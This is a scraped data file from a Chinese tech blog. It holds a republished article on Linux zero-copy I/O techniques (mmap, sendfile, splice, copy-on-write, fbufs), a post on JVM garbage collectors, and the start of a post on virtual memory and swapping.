I/O如果应用程序可以直接访问网络接口存储，那么在应用程序访问数据之前存储总线就不需要被遍历，数据传输所引起的开销将会是最小的。应用程序或者运行在用户模式下的库函数可以直接访问硬件设备的存储，操作系统内核除了进行必要的虚拟存储配置工作之外，不参与数据传输过程中的其它任何事情。直接 I/O 使得数据可以直接在应用程序和外围设备之间进行传输，完全不需要操作系统内核页缓存的支持。关于直接 I/O 技术的具体实现细节可以参看 developerWorks 上的另一篇文章”Linux 中直接 I/O 机制的介绍” ，本文不做过多描述。 图 1. 使用直接 I/O 的数据传输 针对数据传输不需要经过应用程序地址空间的零拷贝技术利用 mmap()在 Linux 中，减少拷贝次数的一种方法是调用 mmap() 来代替调用 read，比如： 1tmp_buf &#x3D; mmap(file, len); &#96;&#96;write(socket, tmp_buf, len); 首先，应用程序调用了 mmap() 之后，数据会先通过 DMA 拷贝到操作系统内核的缓冲区中去。接着，应用程序跟操作系统共享这个缓冲区，这样，操作系统内核和应用程序存储空间就不需要再进行任何的数据拷贝操作。应用程序调用了 write() 之后，操作系统内核将数据从原来的内核缓冲区中拷贝到与 socket 相关的内核缓冲区中。接下来，数据从内核 socket 缓冲区拷贝到协议引擎中去，这是第三次数据拷贝操作。 图 2. 利用 mmap() 代替 read() 通过使用 mmap() 来代替 read(), 已经可以减半操作系统需要进行数据拷贝的次数。当大量数据需要传输的时候，这样做就会有一个比较好的效率。但是，这种改进也是需要代价的，使用 mma()p 其实是存在潜在的问题的。当对文件进行了内存映射，然后调用 write() 系统调用，如果此时其他的进程截断了这个文件，那么 write() 系统调用将会被总线错误信号 SIGBUS 中断，因为此时正在执行的是一个错误的存储访问。这个信号将会导致进程被杀死，解决这个问题可以通过以下这两种方法： 为 SIGBUS 安装一个新的信号处理器，这样，write() 系统调用在它被中断之前就返回已经写入的字节数目，errno 会被设置成 success。但是这种方法也有其缺点，它不能反映出产生这个问题的根源所在，因为 BIGBUS 信号只是显示某进程发生了一些很严重的错误。 第二种方法是通过文件租借锁来解决这个问题的，这种方法相对来说更好一些。我们可以通过内核对文件加读或者写的租借锁，当另外一个进程尝试对用户正在进行传输的文件进行截断的时候，内核会发送给用户一个实时信号：RT_SIGNAL_LEASE 信号，这个信号会告诉用户内核破坏了用户加在那个文件上的写或者读租借锁，那么 write() 系统调用则会被中断，并且进程会被 SIGBUS 信号杀死，返回值则是中断前写的字节数，errno 也会被设置为 success。文件租借锁需要在对文件进行内存映射之前设置。 使用 mmap 是 POSIX 兼容的，但是使用 mmap 并不一定能获得理想的数据传输性能。数据传输的过程中仍然需要一次 CPU 拷贝操作，而且映射操作也是一个开销很大的虚拟存储操作，这种操作需要通过更改页表以及冲刷 TLB （使得 TLB 的内容无效）来维持存储的一致性。但是，因为映射通常适用于较大范围，所以对于相同长度的数据来说，映射所带来的开销远远低于 CPU 拷贝所带来的开销。 sendfile()为了简化用户接口，同时还要继续保留 mmap()/write() 技术的优点：减少 CPU 的拷贝次数，Linux 在版本 2.1 中引入了 sendfile() 这个系统调用。 sendfile() 不仅减少了数据拷贝操作，它也减少了上下文切换。首先：sendfile() 系统调用利用 DMA 引擎将文件中的数据拷贝到操作系统内核缓冲区中，然后数据被拷贝到与 socket 相关的内核缓冲区中去。接下来，DMA 引擎将数据从内核 socket 缓冲区中拷贝到协议引擎中去。如果在用户调用 sendfile () 系统调用进行数据传输的过程中有其他进程截断了该文件，那么 sendfile () 系统调用会简单地返回给用户应用程序中断前所传输的字节数，errno 会被设置为 success。如果在调用 sendfile() 之前操作系统对文件加上了租借锁，那么 sendfile() 的操作和返回状态将会和 mmap()/write () 一样。 图 3. 利用 sendfile () 进行数据传输 sendfile() 系统调用不需要将数据拷贝或者映射到应用程序地址空间中去，所以 sendfile() 只是适用于应用程序地址空间不需要对所访问数据进行处理的情况。相对于 mmap() 方法来说，因为 sendfile 传输的数据没有越过用户应用程序 / 操作系统内核的边界线，所以 sendfile () 也极大地减少了存储管理的开销。但是，sendfile () 也有很多局限性，如下所列： sendfile() 局限于基于文件服务的网络应用程序，比如 web 服务器。据说，在 Linux 内核中实现 sendfile() 只是为了在其他平台上使用 sendfile() 的 Apache 程序。 由于网络传输具有异步性，很难在 sendfile () 系统调用的接收端进行配对的实现方式，所以数据传输的接收端一般没有用到这种技术。 基于性能的考虑来说，sendfile () 仍然需要有一次从文件到 socket 缓冲区的 CPU 拷贝操作，这就导致页缓存有可能会被传输的数据所污染。 带有 DMA 收集拷贝功能的 sendfile()上小节介绍的 sendfile() 技术在进行数据传输仍然还需要一次多余的数据拷贝操作，通过引入一点硬件上的帮助，这仅有的一次数据拷贝操作也可以避免。为了避免操作系统内核造成的数据副本，需要用到一个支持收集操作的网络接口，这也就是说，待传输的数据可以分散在存储的不同位置上，而不需要在连续存储中存放。这样一来，从文件中读出的数据就根本不需要被拷贝到 socket 缓冲区中去，而只是需要将缓冲区描述符传到网络协议栈中去，之后其在缓冲区中建立起数据包的相关结构，然后通过 DMA 收集拷贝功能将所有的数据结合成一个网络数据包。网卡的 DMA 引擎会在一次操作中从多个位置读取包头和数据。Linux 2.4 版本中的 socket 缓冲区就可以满足这种条件，这也就是用于 Linux 中的众所周知的零拷贝技术，这种方法不但减少了因为多次上下文切换所带来开销，同时也减少了处理器造成的数据副本的个数。对于用户应用程序来说，代码没有任何改变。首先，sendfile() 系统调用利用 DMA 引擎将文件内容拷贝到内核缓冲区去；然后，将带有文件位置和长度信息的缓冲区描述符添加到 socket 缓冲区中去，此过程不需要将数据从操作系统内核缓冲区拷贝到 socket 缓冲区中，DMA 引擎会将数据直接从内核缓冲区拷贝到协议引擎中去，这样就避免了最后一次数据拷贝。 图 4. 带有 DMA 收集拷贝功能的 sendfile 通过这种方法，CPU 在数据传输的过程中不但避免了数据拷贝操作，理论上，CPU 也永远不会跟传输的数据有任何关联，这对于 CPU 的性能来说起到了积极的作用：首先，高速缓冲存储器没有受到污染；其次，高速缓冲存储器的一致性不需要维护，高速缓冲存储器在 DMA 进行数据传输前或者传输后不需要被刷新。然而实际上，后者实现起来非常困难。源缓冲区有可能是页缓存的一部分，这也就是说一般的读操作可以访问它，而且该访问也可以是通过传统方式进行的。只要存储区域可以被 CPU 访问到，那么高速缓冲存储器的一致性就需要通过 DMA 传输之前冲刷新高速缓冲存储器来维护。而且，这种数据收集拷贝功能的实现是需要硬件以及设备驱动程序支持的。 splice()splice() 是 Linux 中与 mmap() 和 sendfile() 类似的一种方法。它也可以用于用户应用程序地址空间和操作系统地址空间之间的数据传输。splice() 适用于可以确定数据传输路径的用户应用程序，它不需要利用用户地址空间的缓冲区进行显式的数据传输操作。那么，当数据只是从一个地方传送到另一个地方，过程中所传输的数据不需要经过用户应用程序的处理的时候，spice() 就成为了一种比较好的选择。splice() 可以在操作系统地址空间中整块地移动数据，从而减少大多数数据拷贝操作。而且，splice() 进行数据传输可以通过异步的方式来进行，用户应用程序可以先从系统调用返回，而操作系统内核进程会控制数据传输过程继续进行下去。splice() 可以被看成是类似于基于流的管道的实现，管道可以使得两个文件描述符相互连接，splice 的调用者则可以控制两个设备（或者协议栈）在操作系统内核中的相互连接。 splice() 系统调用和 sendfile() 非常类似，用户应用程序必须拥有两个已经打开的文件描述符，一个用于表示输入设备，一个用于表示输出设备。与 sendfile() 不同的是，splice() 允许任意两个文件之间互相连接，而并不只是文件到 socket 进行数据传输。对于从一个文件描述符发送数据到 socket 这种特例来说，一直都是使用 sendfile() 这个系统调用，而 splice 一直以来就只是一种机制，它并不仅限于 sendfile() 的功能。也就是说，sendfile() 只是 splice() 的一个子集，在 Linux 2.6.23 中，sendfile() 这种机制的实现已经没有了，但是这个 API 以及相应的功能还存在，只不过 API 以及相应的功能是利用了 splice() 这种机制来实现的。 在数据传输的过程中，splice() 机制交替地发送相关的文件描述符的读写操作，并且可以将读缓冲区重新用于写操作。它也利用了一种简单的流控制，通过预先定义的水印（ watermark ）来阻塞写请求。有实验表明，利用这种方法将数据从一个磁盘传输到另一个磁盘会增加 30% 到 70% 的吞吐量，数据传输的过程中， CPU 的负载也会减少一半。 Linux 2.6.17 内核引入了 splice() 系统调用，但是，这个概念在此之前 ] 其实已经存在了很长一段时间了。1988 年，Larry McVoy 提出了这个概念，它被看成是一种改进服务器端系统的 I/O 性能的一种技术，尽管在之后的若干年中经常被提及，但是 splice 系统调用从来没有在主流的 Linux 操作系统内核中实现过，一直到 Linux 2.6.17 版本的出现。splice 系统调用需要用到四个参数，其中两个是文件描述符，一个表示文件长度，还有一个用于控制如何进行数据拷贝。splice 系统调用可以同步实现，也可以使用异步方式来实现。在使用异步方式的时候，用户应用程序会通过信号 SIGIO 来获知数据传输已经终止。splice() 系统调用的接口如下所示： 1long splice(int fdin, int fdout, size_t len, unsigned int flags); 调用 splice() 系统调用会导致操作系统内核从数据源 fdin 移动最多 len 个字节的数据到 fdout 中去，这个数据的移动过程只是经过操作系统内核空间，需要最少的拷贝次数。使用 splice() 系统调用需要这两个文件描述符中的一个必须是用来表示一个管道设备的。不难看出，这种设计具有局限性，Linux 的后续版本针对这一问题将会有所改进。参数 flags 用于表示拷贝操作的执行方法，当前的 flags 有如下这些取值： SPLICE_F_NONBLOCK：splice 操作不会被阻塞。然而，如果文件描述符没有被设置为不可被阻塞方式的 I/O ，那么调用 splice 有可能仍然被阻塞。 SPLICE_F_MORE：告知操作系统内核下一个 splice 系统调用将会有更多的数据传来。 SPLICE_F_MOVE：如果输出是文件，这个值则会使得操作系统内核尝试从输入管道缓冲区直接将数据读入到输出地址空间，这个数据传输过程没有任何数据拷贝操作发生。 Splice() 系统调用利用了 Linux 提出的管道缓冲区（ pipe buffer ）机制，这就是为什么这个系统调用的两个文件描述符参数中至少有一个必须要指代管道设备的原因。为了支持 splice 这种机制，Linux 在用于设备和文件系统的 file_operations 结构中增加了下边这两个定义： 1ssize_t (*splice_write)(struct inode *pipe, strucuct file *out, &#96;&#96; &#96;&#96;size_t len, unsigned int flags); &#96;&#96;ssize_t (*splice_read)(struct inode *in, strucuct file *pipe, &#96;&#96; &#96;&#96;size_t len, unsigned int flags); 这两个新的操作可以根据 flags 的设定在 pipe 和 in 或者 out 之间移动 len 个字节。Linux 文件系统已经实现了具有上述功能并且可以使用的操作，而且还实现了一个 generic_splice_sendpage() 函数用于和 socket 之间的接合。 对应用程序地址空间和内核之间的数据传输进行优化的零拷贝技术前面提到的几种零拷贝技术都是通过尽量避免用户应用程序和操作系统内核缓冲区之间的数据拷贝来实现的，使用上面那些零拷贝技术的应用程序通常都要局限于某些特殊的情况：要么不能在操作系统内核中处理数据，要么不能在用户地址空间中处理数据。而这一小节提出的零拷贝技术保留了传统在用户应用程序地址空间和操作系统内核地址空间之间传递数据的技术，但却在传输上进行优化。我们知道，数据在系统软件和硬件之间的传递可以通过 DMA 传输来提高效率，但是对于用户应用程序和操作系统之间进行数据传输这种情况来说，并没有类似的工具可以使用。本节介绍的技术就是针对这种情况提出来的。 利用写时复制在某些情况下，Linux 操作系统内核中的页缓存可能会被多个应用程序所共享，操作系统有可能会将用户应用程序地址空间缓冲区中的页面映射到操作系统内核地址空间中去。如果某个应用程序想要对这共享的数据调用 write() 系统调用，那么它就可能破坏内核缓冲区中的共享数据，传统的 write() 系统调用并没有提供任何显示的加锁操作，Linux 中引入了写时复制这样一种技术用来保护数据。 什么是写时复制 写时复制是计算机编程中的一种优化策略，它的基本思想是这样的：如果有多个应用程序需要同时访问同一块数据，那么可以为这些应用程序分配指向这块数据的指针，在每一个应用程序看来，它们都拥有这块数据的一份数据拷贝，当其中一个应用程序需要对自己的这份数据拷贝进行修改的时候，就需要将数据真正地拷贝到该应用程序的地址空间中去，也就是说，该应用程序拥有了一份真正的私有数据拷贝，这样做是为了避免该应用程序对这块数据做的更改被其他应用程序看到。这个过程对于应用程序来说是透明的，如果应用程序永远不会对所访问的这块数据进行任何更改，那么就永远不需要将数据拷贝到应用程序自己的地址空间中去。这也是写时复制的最主要的优点。 写时复制的实现需要 MMU 的支持，MMU 需要知晓进程地址空间中哪些特殊的页面是只读的，当需要往这些页面中写数据的时候，MMU 就会发出一个异常给操作系统内核，操作系统内核就会分配新的物理存储空间，即将被写入数据的页面需要与新的物理存储位置相对应。 写时复制的最大好处就是可以节约内存。不过对于操作系统内核来说，写时复制增加了其处理过程的复杂性。 数据传输的实现及其局限性 数据发送端\\ 对于数据传输的发送端来说，实现相对来说是比较简单的，对与应用程序缓冲区相关的物理页面进行加锁，并将这些页面映射到操作系统内核的地址空间，并标识为“ write only ”。当系统调用返回的时候，用户应用程序和网络堆栈就都可以读取该缓冲区中的数据。在操作系统已经传送完所有的数据之后，应用程序就可以对这些数据进行写操作。如果应用程序尝试在数据传输完成之前对数据进行写操作，那么就会产生异常，这个时候操作系统就会将数据拷贝到应用程序自己的缓冲区中去，并且重置应用程序端的映射。数据传输完成之后，对加锁的页面进行解锁操作，并重置 COW 标识。 数据接收端\\ 对于数据接收端来说，该技术的实现则需要处理复杂得多的情况。如果 read() 系统调用是在数据包到达之前发出的，并且应用程序是被阻塞的，那么 read() 系统调用就会告知操作系统接收到的数据包中的数据应该存放到什么地方去。在这种情况下，根本没有必要进行页面重映射，网络接口卡可以提供足够的支持让数据直接存入用户应用程序的缓冲区中去。如果数据接收是异步的，在 read() 系统调用发出之前，操作系统不知道该把数据写到哪里，因为它不知道用户应用程序缓冲区的位置，所以操作系统内核必须要先把数据存放到自己的缓冲区中去。 局限性\\ 写时复制技术有可能会导致操作系统的处理开销很大．所有相关的缓冲区都必须要进行页对齐处理，并且使用的 MMU 页面一定要是整数个的。对于发送端来说，这不会造成什么问题。但是对于接收端来说，它需要有能力处理更加复杂的情况。首先，数据包的尺寸大小要合适，大小需要恰到好处能够覆盖一整页的数据，这就限制了那些 MTU 大小大于系统内存页的网络，比如 FDDI 和 ATM。其次，为了在没有任何中断的情况下将页面重映射到数据包的流，数据包中的数据部分必须占用整数个页面。对于异步接收数据的情况来说，为了将数据高效地移动到用户地址空间中去，可以使用这样一种方法：利用网络接口卡的支持，传来的数据包可以被分割成包头和数据两部分，数据被存放在一个单独的缓冲区内，虚拟存储系统然后就会将数据映射到用户地址空间缓冲区去。使用这种方法需要满足两个先决条件，也就是上面提到过的：一是应用程序缓冲区必须是页对齐的，并且在虚拟存储上是连续的；二是传来的数据有一页大小的时候才可以对数据包进行分割。事实上，这两个先决条件是很难满足的。如果应用程序缓冲区不是页对齐的，或者数据包的大小超过一个页，那么数据就需要被拷贝。对于数据发送端来说，就算数据在传输的过程中对于应用程序来说是写保护的，应用程序仍然需要避免使用这些忙缓冲区，这是因为写时拷贝操作所带来的开销是很大的。如果没有端到端这一级别的通知，那么应用程序很难会知道某缓冲区是否已经被释放还是仍然在被占用。 这种零拷贝技术比较适用于那种写时复制事件发生比较少的情况，因为写时复制事件所产生的开销要远远高于一次 CPU 拷贝所产生的开销。实际情况中，大多数应用程序通常都会多次重复使用相同的缓冲区，所以，一次使用完数据之后，不要从操作系统地址空间解除页面的映射，这样会提高效率。考虑到同样的页面可能会被再次访问，所以保留页面的映射可以节省管理开销，但是，这种映射保留不会减少由于页表往返移动和 TLB 冲刷所带来的开销，这是因为每次页面由于写时复制而进行加锁或者解锁的时候，页面的只读标志都要被更改。 缓冲区共享还有另外一种利用预先映射机制的共享缓冲区的方法也可以在应用程序地址空间和操作系统内核之间快速传输数据。采用缓冲区共享这种思想的架构最先在 Solaris 上实现，该架构使用了“ fbufs ”这个概念。这种方法需要修改 API。应用程序地址空间和操作系统内核地址空间之间的数据传递需要严格按照 fbufs 体系结构来实现，操作系统内核之间的通信也是严格按照 fbufs 体系结构来完成的。每一个应用程序都有一个缓冲区池，这个缓冲区池被同时映射到用户地址空间和内核地址空间，也可以在必要的时候才创建它们。通过完成一次虚拟存储操作来创建缓冲区，fbufs 可以有效地减少由存储一致性维护所引起的大多数性能问题。该技术在 Linux 中还停留在实验阶段。 为什么要扩展 Linux I/O API 传统的 Linux 输入输出接口，比如读和写系统调用，都是基于拷贝的，也就是说，数据需要在操作系统内核和应用程序定义的缓冲区之间进行拷贝。对于读系统调用来说，用户应用程序呈现给操作系统内核一个预先分配好的缓冲区，内核必须把读进来的数据放到这个缓冲区内。对于写系统调用来说，只要系统调用返回，用户应用程序就可以自由重新利用数据缓冲区。 为了支持上面这种机制，Linux 需要能够为每一个操作都进行建立和删除虚拟存储映射。这种页面重映射的机制依赖于机器配置、cache 体系结构、TLB 未命中处理所带来的开销以及处理器是单处理器还是多处理器等多种因素。如果能够避免处理 I/O 请求的时候虚拟存储 / TLB 操作所产生的开销，则会极大地提高 I/O 的性能。fbufs 就是这样一种机制。使用 fbufs 体系结构就可以避免虚拟存储操作。由数据显示，fbufs 这种结构在 DECStation™ 5000/200 这个单处理器工作站上会取得比上面提到的页面重映射方法好得多的性能。如果要使用 fbufs 这种体系结构，必须要扩展 Linux API，从而实现一种有效而且全面的零拷贝技术。 快速缓冲区（ Fast Buffers ）原理介绍 I/O 数据存放在一些被称作 fbufs 的缓冲区内，每一个这样的缓冲区都包含一个或者多个连续的虚拟存储页。应用程序访问 fbuf 是通过保护域来实现的，有如下这两种方式： 如果应用程序分配了 fbuf，那么应用程序就有访问该 fbuf 的权限 如果应用程序通过 IPC 接收到了 fbuf，那么应用程序对这个 fbuf 也有访问的权限 对于第一种情况来说，这个保护域被称作是 fbuf 的“ originator ”；对于后一种情况来说，这个保护域被称作是 fbuf 的“ receiver ”。 传统的 Linux I/O 接口支持数据在应用程序地址空间和操作系统内核之间交换，这种交换操作导致所有的数据都需要进行拷贝。如果采用 fbufs 这种方法，需要交换的是包含数据的缓冲区，这样就消除了多余的拷贝操作。应用程序将 fbuf 传递给操作系统内核，这样就能减少传统的 write 系统调用所产生的数据拷贝开销。同样的，应用程序通过 fbuf 来接收数据，这样也可以减少传统 read 系统调用所产生的数据拷贝开销。如下图所示： 图 5. Linux I/O API I/O 子系统或者应用程序都可以通过 fbufs 管理器来分配 fbufs。一旦分配了 fbufs，这些 fbufs 就可以从程序传递到 I/O 子系统，或者从 I/O 子系统传递到程序。使用完后，这些 fbufs 会被释放回 fbufs 缓冲区池。 fbufs 在实现上有如下这些特性，如图 9 所示： fbuf 需要从 fbufs 缓冲区池里分配。每一个 fbuf 都存在一个所属对象，要么是应用程序，要么是操作系统内核。fbuf 可以在应用程序和操作系统之间进行传递，fbuf 使用完之后需要被释放回特定的 fbufs 缓冲区池，在 fbuf 传递的过程中它们需要携带关于 fbufs 缓冲区池的相关信息。 每一个 fbufs 缓冲区池都会和一个应用程序相关联，一个应用程序最多只能与一个 fbufs 缓冲区池相关联。应用程序只有资格访问它自己的缓冲区池。 fbufs 不需要虚拟地址重映射，这是因为对于每个应用程序来说，它们可以重新使用相同的缓冲区集合。这样，虚拟存储转换的信息就可以被缓存起来，虚拟存储子系统方面的开销就可以消除。 I/O 子系统（设备驱动程序，文件系统等）可以分配 fbufs，并将到达的数据直接放到这些 fbuf 里边。这样，缓冲区之间的拷贝操作就可以避免。 图 6. fbufs 体系结构 前面提到，这种方法需要修改 API，如果要使用 fbufs 体系结构，应用程序和 Linux 操作系统内核驱动程序都需要使用新的 API，如果应用程序要发送数据，那么它就要从缓冲区池里获取一个 fbuf，将数据填充进去，然后通过文件描述符将数据发送出去。接收到的 fbufs 可以被应用程序保留一段时间，之后，应用程序可以使用它继续发送其他的数据，或者还给缓冲区池。但是，在某些情况下，需要对数据包内的数据进行重新组装，那么通过 fbuf 接收到数据的应用程序就需要将数据拷贝到另外一个缓冲区内。再者，应用程序不能对当前正在被内核处理的数据进行修改，基于这一点，fbufs 体系结构引入了强制锁的概念以保证其实现。对于应用程序来说，如果 fbufs 已经被发送给操作系统内核，那么应用程序就不会再处理这些 fbufs。 fbufs 存在的一些问题 管理共享缓冲区池需要应用程序、网络软件、以及设备驱动程序之间的紧密合作。对于数据接收端来说，网络硬件必须要能够将到达的数据包利用 DMA 传输到由接收端分配的正确的存储缓冲区池中去。而且，应用程序稍微不注意就会更改之前发到共享存储中的数据的内容，从而导致数据被破坏，但是这种问题在应用程序端是很难调试的。同时，共享存储这种模型很难与其他类型的存储对象关联使用，但是应用程序、网络软件以及设备驱动程序之间的紧密合作是需要其他存储管理器的支持的。对于共享缓冲区这种技术来说，虽然这种技术看起来前景光明，但是这种技术不但需要对 API 进行更改，而且需要对驱动程序也进行更改，并且这种技术本身也存在一些未解决的问题，这就使得这种技术目前还只是出于试验阶段。在测试系统中，这种技术在性能上有很大的改进，不过这种新的架构的整体安装目前看起来还是不可行的。这种预先分配共享缓冲区的机制有时也因为粒度问题需要将数据拷贝到另外一个缓冲区中去。 转自：https://www.ibm.com/developerworks/cn/linux/l-cn-zerocopy2/index.html","categories":[{"name":"操做系统","slug":"操做系统","permalink":"https://gschaos.club/categories/%E6%93%8D%E5%81%9A%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"操做系统","slug":"操做系统","permalink":"https://gschaos.club/tags/%E6%93%8D%E5%81%9A%E7%B3%BB%E7%BB%9F/"}]},{"title":"jvm垃圾回收算法","slug":"jvm垃圾回收算法","date":"2020-09-27T16:00:00.000Z","updated":"2020-10-25T08:24:42.000Z","comments":true,"path":"jvm垃圾回收算法/","link":"","permalink":"https://gschaos.club/jvm%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95/","excerpt":"","text":"垃圾回收Java堆内存分为新生代和老年代:新生代主要存储短生命周期的对象,适合使用复制算法进行垃圾回收;老年代主要存储长生命周期的对象,适合使用标记整理算法进行垃圾回收因此,JVM针对新生代和老年代分别提供了多种不同的垃圾收集器,针对新生代提供的垃圾收集器有串行ParNew并行清除,针对老年代提供的垃圾收集器有串行老并行老CMS,还有针对不同区域的G1分区收集算法,如图。 Serial 垃圾收集器:单线程,复制算法Serial 垃圾收集器基于复制算法实现,它是一个单线程收集器,在它正在进行垃圾收集时,必须暂停其他所有工作线程,直到垃圾收集结束 Serial 垃圾收集器采用了复制算法,简单 高效,对于单 CPU 运行环境来说,没有线程交互开销,可以获得最高的单线程垃圾收集效率,因此 Serial 垃圾收集器是 Java 虚拟机运行在 Client 模式下的新生代的默认垃圾收集器。 ParNew 垃圾收集器:多线程,复制算法ParNew 垃圾收集器是 Serial 垃圾收集器的多线程实现,同样采用了复制算法,它采用多线程模式工作,除此之外和 Serial 收集器几乎一样 ParNew 垃圾收集器在垃圾收集过程中会暂停所有其他工作线程,是 Java 虚拟机运行在 Server 模式下的新生代的默认垃圾收集器 。 ParNew 垃圾收集器默认开启与 CPU 同等数量的线程进行垃圾回收,在 Java 应用启动时可通过-XX:ParallelGCThreads 参数调节 ParNew 垃圾收集器的工作线程数。 Parallel Scavenge 垃圾收集器:多线程,复制算法Parallel Scavenge 收集器是为提高新生代垃圾收集效率而设计的垃圾收集器,基于多线程复制算法实现,在系统吞吐量上有很大的优化,可以更高效地利用 CPU 尽快完成垃圾回收任务。 Parallel Scavenge 通过自适应调节策略提高系统吞吐量,提供了三个参数用于调节 控制垃圾回收的停顿时间及吞吐量,分别是控制最大垃圾收集停顿时间的-XX:MaxGCPauseMillis 参数,控制吞吐量大小的-XX:GCTimeRatio 参数和控制自适应调节策略开启与否的 UseAdaptiveSizePolicy 参数。 Serial Old 垃圾收集器:单线程,标记整理算法 Serial Old 垃圾收集器是 Serial 垃圾收集器的老年代实现,同 Serial 一样采用单线程执行,不同的是,Serial Old 针对老年代长生命周期的特点基于标记整理算法实现 Serial Old 垃圾收集器是 JVM 运行在 Client 模式下的老年代的默认垃圾收集器。 新生代的 Serial 垃圾收集器和老年代的 Serial Old 垃圾收集器可搭配使用,分别针对 JVM 的新生代和老年代进行垃圾回收,其垃圾收集过程如图所示 在新生代采用 Serial 垃圾收集器基于复制算法进行垃圾回收,未被其回收的对象在老年代被 Serial Old 垃圾收集器基于标记整理算法进行垃圾回收。 Parallel Old 垃圾收集器:多线程,标记整理算法 Parallel Old 垃圾收集器采用多线程并发进行垃圾回收,它根据老年代长生命周期的特点,基于多线程的标记整理算法实现 Parallel Old 垃圾收集器在设计上优先考虑系统吞吐量,其次考虑停顿时间等因素,如果系统对吞吐量的要求较高,则可以优先考虑新生代的 Parallel Scavenge 垃圾收集器和老年代的 Parallel Old 垃圾收集器的配合使用。 新生代的 Parallel Scavenge 垃圾收集器和老年代的 Parallel Old 垃圾收集器的搭配运行过程如图所示 新生代基于 Parallel Scavenge 垃圾收集器的复制算法进行垃圾回收,老年代基于 Parallel Old 垃圾收集器的标记整理算法进行垃圾回收。 CMS垃圾回收器CMS(Concurrent Mark Sweep)垃圾收集器是为老年代设计的垃圾收集器,其主要目的是达到最短的垃圾回收停顿时间,基于线程的标记清除算法实现,以便在多线程并发环境下以最短的垃圾收集停顿时间提高系统的稳定性。 CMS 的工作机制相对复杂,垃圾回收过程包含如下 4 个步骤 (1)初始标记:只标记和 GC Roots 直接关联的对象,速度很快,需要暂停所有工作线程 。 (2)并发标记:和用户线程一起工作,执行 GC Roots 跟踪标记过程,不需要暂停工作线程 。 (3)重新标记:在并发标记过程中用户线程继续运行,导致在垃圾回收过程中部分对象的状态发生变化,为了确保这部分对象的状态正确性,需要对其重新标记并暂停工作线程 。 (4)并发清除:和用户线程一起工作,执行清除 GC Roots 不可达对象的任务,不需要暂停工作线程。 CMS 垃圾收集器在和用户线程一起工作时(并发标记和并发清除)不需要暂停用户线程,有效缩短了垃圾回收时系统的停顿时间,同时由于 CMS 垃圾收集器和用户线程一起工作,因此其并行度和效率也有很大提升 CMS 收集器的工作流程如图。 G1 垃圾收集器 G1(Garbage First)垃圾收集器为了避免全区域垃圾收集引起的系统停顿,将堆内存划分为大小固定的几个独立区域,独立使用这些区域的内存资源并且跟踪这些区域的垃圾收集进度,同时在后台维护一个优先级列表,在垃圾回收过程中根据系统允许的最长垃圾收集时间,优先回收垃圾最多的区域 G1 垃圾收集器通过内存区域独立划分使用和根据不同优先级回收各区域垃圾的机制,确保了 G1 垃圾收集器在有限时间内获得最高的垃圾收集效率 相对于 CMS 收集器,G1 垃圾收集器两个突出的改进 基于标记整理算法,不产生内存碎片 。 可以精确地控制停顿时间,在不牺牲吞吐量的前提下实现短停顿垃圾回收。","categories":[{"name":"jvm","slug":"jvm","permalink":"https://gschaos.club/categories/jvm/"}],"tags":[{"name":"java","slug":"java","permalink":"https://gschaos.club/tags/java/"},{"name":"jvm","slug":"jvm","permalink":"https://gschaos.club/tags/jvm/"}]},{"title":"操作系统-虚拟存储管理","slug":"操作系统-虚拟存储管理","date":"2020-09-27T16:00:00.000Z","updated":"2020-10-25T08:28:57.000Z","comments":true,"path":"操作系统-虚拟存储管理/","link":"","permalink":"https://gschaos.club/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E8%99%9A%E6%8B%9F%E5%AD%98%E5%82%A8%E7%AE%A1%E7%90%86/","excerpt":"","text":"交换技术交换（Swapping）技术它的主要特点是：打破了一个程序一旦进入内存，就一直驻留在内存直到运行结束的限制。 在多道程序环境下，内存中可以同时存在多个进程（程序），其中的一部分进程由于等待某些事件而处于阻塞状态，但这些处于阻塞状态的进程仍然驻留内存，并占据着内存空间；另一方面，外存上可能有许多等待装入内存运行的程序，却因内存不足而未能装入。显然，这是一种严重的系统资源浪费，它会使系统的吞吐量下降。为了解决这个问题，可以在操作系统中增加交换（对换）功能，即由操作系统根据需要，将内存中暂时不具备运行条件的部分程序或数据移到外存（换出），以便腾出足够的内存空间，将外存中需要运行的程序或数据调入内存（换入）投入运行。在操作系统中引入交换（对换）技术，可以显著提高内存资源的利用率并改善系统的性能。 以交换的单位不同来划分，则有以下两种交换方式。 以进程为单位的交换。每次换入/换出的是整个进程，我们称这种交换为进程交换（进程对换）或整体交换（整体对换）。进程交换广泛应用于分时系统，主要解决内存紧张问题。 以页（此处不多做介绍）或段（此处不多做介绍）为单位的交换。这种交换分别称为页置换（页交换或页对换）或段置换（段交换或段对换），页置换和段置换是以进程中的某一部分为交换单位，因此又称为部分交换（部分对换）。部分交换广泛应用于现代操作系统中，是实现虚拟存储器的基础。 我们这里所说的交换是指进程交换，为了实现进程交换，操作系统需要解决以下两个问题。 对换空间的管理。在具有交换功能的操作系统中，一般将外存空间分为文件区和交换区（对换区）。文件区用来存放文件，而交换区则用来存放从内存中换出的进程，或等待换入内存的进程。尽管文件区一般采用离散分配方式来分配外存存储空间，但交换区的存储空间分配则宜采用连续分配方式，这是因为交换区中存放的是换入/换出的进程，为了提高交换速度，有必要采用连续分配方式，并且交换区可以采用与可变分区存储管理类似的方法进行管理。例如，使用空闲分区表或空闲分区链来记录外存交换区的使用情况，利用首次适应算法、最佳适应算法或最差适应算法来进行外存交换区的分配。 交换的时机以及选择哪些进程交换。交换时机一般选择在进程的时间片用完，以及进程等待输入/输出时，或者在进程要求扩充其内存空间而得不到满足时。换出到外存的进程一般选择处于阻塞状态，或优先级低且短时间内不会再次投入运行的进程；换入到内存的进程则应选择换出时间最久且已处于就绪状态的进程。 概念​ 根据程序的局部性原理，一个进程在运行的某个时间段内只访问其程序的一部分指令或数据，所以就没必要在进程运行之前将其所属的全部程序和数据都装入内存，即只装入进程当前运行所需要的部分程序和部分数据就可启动运行，以后再根据需要逐次装入剩余的部分程序和数据。并且，内存中暂不执行的部分程序和暂不使用部分数据也不必放在内存，可以将其由内存调至外存，释放它们所占用的内存空间。对内存中的各进程也是如此，内存中暂时没有执行的进程也可以将其由内存调至外存，释放它所占用的内存空间，并用来装入外存上需要投入运行的进程，被调出到外存的进程在以后需要运行时，再重新调入内存。这样一来，在内存容量不变的情况下，就可以使一个大程序在较小的内存空间中运行，也可以装入更多的进程（程序）并发执行。 